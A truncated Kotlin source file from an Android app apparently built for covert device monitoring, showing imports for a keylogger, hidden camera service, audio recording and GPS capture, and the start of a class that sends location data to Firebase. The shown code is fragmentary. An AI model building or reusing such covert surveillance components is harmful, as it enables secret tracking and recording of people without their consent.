package com.github.xero.istheapp.services.accessibilityData
...
import com.github.xero.istheapp.data.model.ChildPhoto
import com.github.xero.istheapp.data.model.ChildRecording
import com.github.xero.istheapp.data.model.Photo
import com.github.xero.istheapp.data.model.Recording
...
import com.github.xero.istheapp.utils.ConstFun.getRandomNumeric
import com.github.xero.istheapp.utils.ConstFun.showApp
import com.github.xero.istheapp.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.xero.istheapp.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.xero.istheapp.utils.Consts.CHILD_GPS
import com.github.xero.istheapp.utils.Consts.CHILD_PERMISSION
import com.github.xero.istheapp.utils.Consts.CHILD_SERVICE_DATA
...
import com.github.xero.istheapp.utils.Consts.INTERVAL
import com.github.xero.istheapp.utils.Consts.KEY_LOGGER
import com.github.xero.istheapp.utils.Consts.KEY_TEXT
import com.github.xero.istheapp.utils.Consts.LOCATION
import com.github.xero.istheapp.utils.Consts.PARAMS
...
import com.github.xero.istheapp.utils.Consts.TIMER
import com.github.xero.istheapp.utils.FileHelper
import com.github.xero.istheapp.utils.FileHelper.getFileNameAudio
import com.github.xero.istheapp.utils.FileHelper.getFilePath
import com.github.xero.istheapp.utils.MediaRecorderUtils
import com.github.xero.istheapp.utils.MyCountDownTimer
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.xero.istheapp.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.github.xero.istheapp.data.model.Location(location.latitude, location.longitude, address, getDateTime())
